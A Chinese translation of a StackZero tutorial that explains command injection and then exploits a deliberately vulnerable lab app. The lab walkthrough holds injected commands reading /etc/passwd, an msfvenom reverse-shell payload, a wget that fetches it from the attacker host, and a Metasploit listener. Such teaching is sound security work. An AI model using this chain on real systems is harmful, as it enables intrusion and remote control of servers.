<html>
<head>
<title>What is command injection and how to exploit it — StackZero</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">什么是命令注入以及如何利用它— StackZero</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/what-is-command-injection-and-how-to-exploit-it-stackzero-ac7643bc492?source=collection_archive---------0-----------------------#2022-08-07">https://infosecwriteups.com/what-is-command-injection-and-how-to-exploit-it-stackzero-ac7643bc492?source=collection_archive---------0-----------------------#2022-08-07</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><figure class="gl gn jr js jt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi jq"><img src="../Images/e22b7d1f22a844af7bc0f97b18d7c510.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*i5nOonOhJBvPLdr8.jpg"/></div></div></figure><h1 id="7fc4" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">命令注入简介</h1><p id="24a6" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">大家好，在这篇文章中，我想通过一个非常简单的实例向大家介绍命令注入。<br/>我还建议您阅读目标应用程序的代码，以便更好地理解，但现在让我们进入要点！</p><p id="9ce4" class="pw-post-body-paragraph kz la it lb b lc lx le lf lg ly li lj lk lz lm ln lo ma lq lr ls mb lu lv lw im bi translated">命令注入是一种利用软件应用程序中的安全缺陷的代码注入技术。<br/>该漏洞存在于应用程序传递不安全的用户提供的数据(表单、cookies、HTTP头等)时。)到系统外壳以供执行。<br/>攻击者可以利用该漏洞在主机操作系统上执行任意外壳命令。<br/>命令注入之所以如此危险，是因为攻击者可以执行任何系统命令，而不仅仅是应用程序设计运行的命令。这给了攻击者对系统的完全控制，他可以用它来做任何事情；从删除关键文件到通过系统崩溃发起拒绝服务攻击。命令注入通常用于利用允许用户通过HTTP GET或POST请求提交数据的web应用程序。但是，任何使用不安全的用户提供的数据执行系统命令的应用程序都容易受到攻击。</p><p id="4c48" class="pw-post-body-paragraph kz la it lb b lc lx le lf lg ly li lj lk lz lm ln lo ma lq lr ls mb lu lv lw im bi translated">为了防止命令注入攻击，千万不要将未经整理的用户提供的数据传递给系统shell，这一点很重要。开发人员应该以这样一种方式设计应用程序，即数据在被传递给系统命令之前总是被验证和转义。</p><h1 id="f94f" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">PHP函数面临命令注入攻击的风险</h1><p id="0116" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">由于PHP在网络上无处不在，我想列出一些每个开发者都应该注意的关键功能:</p><ul class=""><li id="b36e" class="mc md it lb b lc lx lg ly lk me lo mf ls mg lw mh mi mj mk bi translated">它执行应用程序作为参数传递的命令。</li><li id="1de6" class="mc md it lb b lc mq lg mr lk ms lo mt ls mu lw mh mi mj mk bi translated"><code class="fe ml mm mn mo b"><a class="ae mp" href="https://www.php.net/manual/en/function.shell-exec.php" rel="noopener ugc nofollow" target="_blank">shell_exec()</a></code>执行命令并以字符串形式返回输出。</li><li id="e938" class="mc md it lb b lc mq lg mr lk ms lo mt ls mu lw mh mi mj mk bi translated"><code class="fe ml mm mn mo b"><a class="ae mp" href="https://www.php.net/manual/en/function.system" rel="noopener ugc nofollow" target="_blank">system()</a></code>执行外部命令，然后显示输出</li><li id="65ac" class="mc md it lb b lc mq lg mr lk ms lo mt ls mu lw mh mi mj mk bi translated"><code class="fe ml mm mn mo b"><a class="ae mp" href="https://www.php.net/manual/en/function.passthru" rel="noopener ugc nofollow" target="_blank">passthru()</a></code>执行外部命令，然后显示原始输出</li></ul><p id="ba1e" class="pw-post-body-paragraph kz la it lb b lc lx le lf lg ly li lj lk lz lm ln lo ma lq lr ls mb lu lv lw im bi translated">PHP还提供了两个提供某种净化的函数，但是它们并不总是安全的:</p><ul class=""><li id="6e54" class="mc md it lb b lc lx lg ly lk me lo mf ls mg lw mh mi mj mk bi translated"><code class="fe ml mm mn mo b"><a class="ae mp" href="https://www.php.net/manual/en/function.escapeshellcmd.php" rel="noopener ugc nofollow" target="_blank">escapeshellcmd()</a></code>在应用程序将字符串传递给系统函数之前，它对该字符串的元字符进行转义。</li><li id="72a1" class="mc md it lb b lc mq lg mr lk ms lo mt ls mu lw mh mi mj mk bi translated">在应用程序将字符串用作shell命令之前，对其进行转义。</li></ul><p id="8f7a" class="pw-post-body-paragraph kz la it lb b lc lx le lf lg ly li lj lk lz lm ln lo ma lq lr ls mb lu lv lw im bi translated">正如我们所看到的，这可能很难防止，所以建议尽可能避免在web应用程序中使用操作系统命令。</p><h1 id="f8ad" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">漏洞的类型</h1><p id="9f78" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">攻击者可以通过命令注入攻击来利用一些漏洞，让我们来看看其中的一些:</p><ul class=""><li id="a2b6" class="mc md it lb b lc lx lg ly lk me lo mf ls mg lw mh mi mj mk bi translated"><strong class="lb iu">任意文件上传</strong>是将任何扩展名的任何类型的文件上传到web应用程序的能力。</li><li id="e640" class="mc md it lb b lc mq lg mr lk ms lo mt ls mu lw mh mi mj mk bi translated"><strong class="lb iu">服务器端模板注入(SSTI) </strong>当web应用程序使用用户输入生成网页时，攻击者可以欺骗应用程序运行恶意命令。</li><li id="98c6" class="mc md it lb b lc mq lg mr lk ms lo mt ls mu lw mh mi mj mk bi translated"><strong class="lb iu"> XML外部实体注入(XXE) </strong>是在解析XML过程中出现的输入验证漏洞。这可能导致命令注入攻击。</li><li id="854c" class="mc md it lb b lc mq lg mr lk ms lo mt ls mu lw mh mi mj mk bi translated"><strong class="lb iu">不安全的反序列化</strong>通常服务器从用户那里接收序列化的数据。如果未对它们进行适当的清理，攻击者可以利用漏洞并执行一些命令。</li><li id="6efb" class="mc md it lb b lc mq lg mr lk ms lo mt ls mu lw mh mi mj mk bi translated"><strong class="lb iu">任意命令注入</strong>是一个安全漏洞，允许攻击者通过操纵应用程序上的输入字段，在服务器上注入并执行任意命令。</li></ul><h1 id="7ef4" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">练习前的准备工作</h1><p id="3978" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">现在是时候更好地理解命令注入是如何工作的了，为了做到这一点，我们将利用任意命令注入漏洞。<br/>为了做到这一点，我认为最简单的方法是利用<a class="ae mp" href="https://github.com/StackZeroSec/sdwa" rel="noopener ugc nofollow" target="_blank"> SDWA </a>正如我们在<a class="ae mp" href="https://medium.com/bugbountywriteup/learn-sql-injection-in-practice-by-hacking-vulnerable-application-stackzero-ef7931c72aec" rel="noopener"> SQLi教程</a>和<a class="ae mp" href="https://medium.com/@stackzero/the-terrifying-world-of-cross-site-scripting-xss-part-2-stackzero-cc7fa7e8dcbb" rel="noopener"> XSS利用文章</a>中所做的那样。</p><p id="05e0" class="pw-post-body-paragraph kz la it lb b lc lx le lf lg ly li lj lk lz lm ln lo ma lq lr ls mb lu lv lw im bi translated">在开始我们的旅程之前，我们需要一些东西:</p><p id="06d5" class="pw-post-body-paragraph kz la it lb b lc lx le lf lg ly li lj lk lz lm ln lo ma lq lr ls mb lu lv lw im bi translated">现在我们已经完成了所有工作，所以只需运行应用程序:</p><pre class="mv mw mx my gt mz mo na nb aw nc bi"><span id="b22b" class="nd kc it mo b gy ne nf l ng nh">flask run</span></pre><p id="523a" class="pw-post-body-paragraph kz la it lb b lc lx le lf lg ly li lj lk lz lm ln lo ma lq lr ls mb lu lv lw im bi translated">然后在地址:<code class="fe ml mm mn mo b"><a class="ae mp" href="http://localhost:5000" rel="noopener ugc nofollow" target="_blank">http://localhost:5000</a></code>打开浏览器</p><figure class="mv mw mx my gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi ni"><img src="../Images/e2cafd5c794715bf3a5c664620b9105c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*oXKUXc5LZ-0IQztAKPc4zg.jpeg"/></div></div></figure><h1 id="7f92" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">实践中的命令注入</h1><p id="6d76" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">一旦我们加入“Cmdi”部分，如果我们尝试检查“hackthebox ”,这就是结果。</p><figure class="mv mw mx my gt ju gh gi paragraph-image"><div class="gh gi nj"><img src="../Images/a78d999020e942b7fccd3845e0cf3b1c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1026/format:webp/1*Wpa1mQMKJ0rzY3g6ZgKv_g.jpeg"/></div></figure><p id="7f2e" class="pw-post-body-paragraph kz la it lb b lc lx le lf lg ly li lj lk lz lm ln lo ma lq lr ls mb lu lv lw im bi translated">对于任意命令注入漏洞的存在，我们没有任何线索。无论如何，我们可以猜测，并且知道在基于Unix的系统中分号分隔两个命令，我们可以想象如果漏洞存在，我们会有这样的情况:</p><pre class="mv mw mx my gt mz mo na nb aw nc bi"><span id="9a01" class="nd kc it mo b gy ne nf l ng nh">cat &lt;USERINPUT&gt;</span></pre><p id="649e" class="pw-post-body-paragraph kz la it lb b lc lx le lf lg ly li lj lk lz lm ln lo ma lq lr ls mb lu lv lw im bi translated">那么让我们看看如果我们像这样输入会发生什么:<code class="fe ml mm mn mo b"> ; echo "Hello!"</code></p><figure class="mv mw mx my gt ju gh gi paragraph-image"><div class="gh gi nk"><img src="../Images/4cd9663573e0b01d112229a10bc77b6c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1142/format:webp/1*hUifvD4QOR0CYJDd2ZTorQ.jpeg"/></div></figure><p id="a5e6" class="pw-post-body-paragraph kz la it lb b lc lx le lf lg ly li lj lk lz lm ln lo ma lq lr ls mb lu lv lw im bi translated">那就是命令注入漏洞存在的证明！</p><p id="62f8" class="pw-post-body-paragraph kz la it lb b lc lx le lf lg ly li lj lk lz lm ln lo ma lq lr ls mb lu lv lw im bi translated">显然我们到目前为止所做的都是无用的，但是让我们做一些更有趣的事情，让我们看看系统中的所有用户。</p><p id="1959" class="pw-post-body-paragraph kz la it lb b lc lx le lf lg ly li lj lk lz lm ln lo ma lq lr ls mb lu lv lw im bi translated">在做任何事情之前，我们可以检查服务器操作系统(很可能是Linux服务器)，所以尝试键入:</p><pre class="mv mw mx my gt mz mo na nb aw nc bi"><span id="6f34" class="nd kc it mo b gy ne nf l ng nh">; cat /etc/os-release</span></pre><p id="38bb" class="pw-post-body-paragraph kz la it lb b lc lx le lf lg ly li lj lk lz lm ln lo ma lq lr ls mb lu lv lw im bi translated">这就是结果</p><figure class="mv mw mx my gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi nl"><img src="../Images/30c8ea56e9a0368bf3bef184db5e8d2e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lqvYt5oWC3OBY-rGROvgzQ.jpeg"/></div></div></figure><p id="ab4c" class="pw-post-body-paragraph kz la it lb b lc lx le lf lg ly li lj lk lz lm ln lo ma lq lr ls mb lu lv lw im bi translated">所以输出清楚地告诉我们这是一台Kali Linux机器(正如我们已经知道的)。<br/>我们可以做的另一件好事是通过键入以下命令列出机器中的所有用户:</p><pre class="mv mw mx my gt mz mo na nb aw nc bi"><span id="9732" class="nd kc it mo b gy ne nf l ng nh">; cat /etc/passwd</span></pre><p id="62f2" class="pw-post-body-paragraph kz la it lb b lc lx le lf lg ly li lj lk lz lm ln lo ma lq lr ls mb lu lv lw im bi translated">结果是一个很长的用户列表:</p><figure class="mv mw mx my gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi nm"><img src="../Images/f7e4118dee1d255677e77e936f155301.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CBddGAnlh9nbQ9hhmqKAkA.jpeg"/></div></div></figure><h1 id="a5b8" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">命令注入:如何运行反向shell</h1><p id="4232" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">这种方法有两个主要问题:</p><ul class=""><li id="fff4" class="mc md it lb b lc lx lg ly lk me lo mf ls mg lw mh mi mj mk bi translated">由于没有交互式控件，您会受到一些限制</li><li id="b4aa" class="mc md it lb b lc mq lg mr lk ms lo mt ls mu lw mh mi mj mk bi translated">在现实世界中，这种漏洞很少显示结果，而是“盲目的”</li></ul><p id="b3d4" class="pw-post-body-paragraph kz la it lb b lc lx le lf lg ly li lj lk lz lm ln lo ma lq lr ls mb lu lv lw im bi translated">在这一节中，我们可以看到一些更有趣的东西，我们到目前为止看到的似乎有点有限，可能你想看看如何获得目标系统的控制权！</p><p id="4868" class="pw-post-body-paragraph kz la it lb b lc lx le lf lg ly li lj lk lz lm ln lo ma lq lr ls mb lu lv lw im bi translated">我会告诉你怎么做！</p><h1 id="18ef" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">运行反向shell</h1><p id="5e9f" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">运行一个反向shell可以给你很大的动力，我认为一个Meterpreter可以舒服得多，所以作为攻击者让我们准备好我们的工具。</p><p id="c83c" class="pw-post-body-paragraph kz la it lb b lc lx le lf lg ly li lj lk lz lm ln lo ma lq lr ls mb lu lv lw im bi translated">首先，我们需要在kali攻击者机器中生成我们的python有效负载</p><pre class="mv mw mx my gt mz mo na nb aw nc bi"><span id="aa34" class="nd kc it mo b gy ne nf l ng nh">msfvenom -p python/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=4567 -f raw -o shell-x86.py</span></pre><p id="f786" class="pw-post-body-paragraph kz la it lb b lc lx le lf lg ly li lj lk lz lm ln lo ma lq lr ls mb lu lv lw im bi translated">所以我们告诉有效载荷，我们的受害者必须在端口<em class="nn"> 4567 </em>连接到IP <em class="nn"> 10.0.2.15(我们攻击者的目标IP) </em>。</p><p id="9639" class="pw-post-body-paragraph kz la it lb b lc lx le lf lg ly li lj lk lz lm ln lo ma lq lr ls mb lu lv lw im bi translated">现在我们需要交付我们的有效负载，所以让我们在有效负载的同一个目录中打开一个HTTP服务器，让我们简单地用python来做:</p><pre class="mv mw mx my gt mz mo na nb aw nc bi"><span id="13dc" class="nd kc it mo b gy ne nf l ng nh">python -m http.server</span></pre><p id="75cb" class="pw-post-body-paragraph kz la it lb b lc lx le lf lg ly li lj lk lz lm ln lo ma lq lr ls mb lu lv lw im bi translated">之后，我们在地址:<code class="fe ml mm mn mo b"><a class="ae mp" href="http://10.0.2.15:8000." rel="noopener ugc nofollow" target="_blank">http://10.0.2.15:8000</a></code> <a class="ae mp" href="http://10.0.2.15:8000." rel="noopener ugc nofollow" target="_blank">有一个运行的服务器绑定。</a></p><p id="6306" class="pw-post-body-paragraph kz la it lb b lc lx le lf lg ly li lj lk lz lm ln lo ma lq lr ls mb lu lv lw im bi translated">让我们跳到浏览器上，通过在输入字段中键入以下内容，让目标服务器下载我们的有效负载:</p><pre class="mv mw mx my gt mz mo na nb aw nc bi"><span id="11bd" class="nd kc it mo b gy ne nf l ng nh">; wget <a class="ae mp" href="http://10.0.2.15:8000/shell-x86.py" rel="noopener ugc nofollow" target="_blank">http://10.0.2.15:8000/shell-x86.py</a></span></pre><p id="162b" class="pw-post-body-paragraph kz la it lb b lc lx le lf lg ly li lj lk lz lm ln lo ma lq lr ls mb lu lv lw im bi translated">如图所示:</p><figure class="mv mw mx my gt ju gh gi paragraph-image"><div class="gh gi no"><img src="../Images/db33968339dacb0494b100cbff73df01.png" data-original-src="https://miro.medium.com/v2/resize:fit:1362/format:webp/1*cVa15G28iffM5P4yeVdWIQ.jpeg"/></div></figure><p id="6499" class="pw-post-body-paragraph kz la it lb b lc lx le lf lg ly li lj lk lz lm ln lo ma lq lr ls mb lu lv lw im bi translated">现在负载应该在受害者服务器上，下一步是在攻击者机器上打开一个监听器:</p><p id="6b4f" class="pw-post-body-paragraph kz la it lb b lc lx le lf lg ly li lj lk lz lm ln lo ma lq lr ls mb lu lv lw im bi translated">首先，让我们在安静模式下运行Metasploit:</p><pre class="mv mw mx my gt mz mo na nb aw nc bi"><span id="7c49" class="nd kc it mo b gy ne nf l ng nh">msfconsole -q</span></pre><p id="cc75" class="pw-post-body-paragraph kz la it lb b lc lx le lf lg ly li lj lk lz lm ln lo ma lq lr ls mb lu lv lw im bi translated">其次，我们需要设置处理程序及其参数，我将在一个块中列出所有命令:</p><pre class="mv mw mx my gt mz mo na nb aw nc bi"><span id="3eb3" class="nd kc it mo b gy ne nf l ng nh">use exploit/multi/handler <br/>set PAYLOAD python/meterpreter/reverse_tcp <br/>set LHOST 10.0.2.15 <br/>set LPORT 4567 run</span></pre><p id="a5da" class="pw-post-body-paragraph kz la it lb b lc lx le lf lg ly li lj lk lz lm ln lo ma lq lr ls mb lu lv lw im bi translated">正如我们在下图中看到的，监听器是活动的:</p><figure class="mv mw mx my gt ju gh gi paragraph-image"><div class="gh gi np"><img src="../Images/d6d18cd50c5e72934627f73b01472d4a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1302/format:webp/1*3o3FyQyD_mLe1Lz5UzLZhg.jpeg"/></div></figure><p id="74bd" class="pw-post-body-paragraph kz la it lb b lc lx le lf lg ly li lj lk lz lm ln lo ma lq lr ls mb lu lv lw im bi translated">最后，我们准备运行有效负载，在我们易受攻击的应用程序中，键入:</p><pre class="mv mw mx my gt mz mo na nb aw nc bi"><span id="5171" class="nd kc it mo b gy ne nf l ng nh">; python shell-x86.py</span></pre><p id="4eca" class="pw-post-body-paragraph kz la it lb b lc lx le lf lg ly li lj lk lz lm ln lo ma lq lr ls mb lu lv lw im bi translated">如果我们看着我们的听众，我们会高兴，因为我们在里面！</p><figure class="mv mw mx my gt ju gh gi paragraph-image"><div class="gh gi nq"><img src="../Images/fcf354cf62d9fef00ef95db82a259326.png" data-original-src="https://miro.medium.com/v2/resize:fit:1296/format:webp/1*qZKa6aS8DMVE-YeU7zhFNQ.jpeg"/></div></figure><h1 id="d8b6" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">结论</h1><p id="f278" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">在本文中，我只是触及了表面，但我希望我能让您更清楚地了解这个漏洞有多危险。我希望你喜欢它，我真的很期待写下一部。</p></div><div class="ab cl nr ns hx nt" role="separator"><span class="nu bw bk nv nw nx"/><span class="nu bw bk nv nw nx"/><span class="nu bw bk nv nw"/></div><div class="im in io ip iq"><p id="b744" class="pw-post-body-paragraph kz la it lb b lc lx le lf lg ly li lj lk lz lm ln lo ma lq lr ls mb lu lv lw im bi translated"><em class="nn">原载于2022年8月7日https://www.stackzero.net</em><a class="ae mp" href="https://www.stackzero.net/command-injection/" rel="noopener ugc nofollow" target="_blank"><em class="nn"/></a><em class="nn">。</em></p><p id="f080" class="pw-post-body-paragraph kz la it lb b lc lx le lf lg ly li lj lk lz lm ln lo ma lq lr ls mb lu lv lw im bi translated">来自Infosec的报道:Infosec上每天都会出现很多难以跟上的内容。 <a class="ae mp" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank"> <strong class="lb iu"> <em class="nn">加入我们的每周简讯</em> </strong> </a> <em class="nn">以5篇文章、4个线程、3个视频、2个Github Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</em></p></div></div>    
</body>
</html>